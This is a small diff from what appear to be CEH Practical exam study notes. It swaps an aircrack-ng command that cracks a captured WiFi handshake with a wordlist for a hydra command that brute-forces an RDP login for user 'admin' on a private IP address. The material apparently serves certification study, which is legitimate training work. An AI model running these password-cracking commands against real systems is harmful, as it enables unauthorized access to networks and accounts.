@@ -15,5 +15,5 @@ https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools
 
 
 
-aircrack-ng wifimap.cap -w ~/Desktop/Wordlists/Passwords.txt
+hydra -l admin -P Passwords.txt rdp://10.22.99.170
 
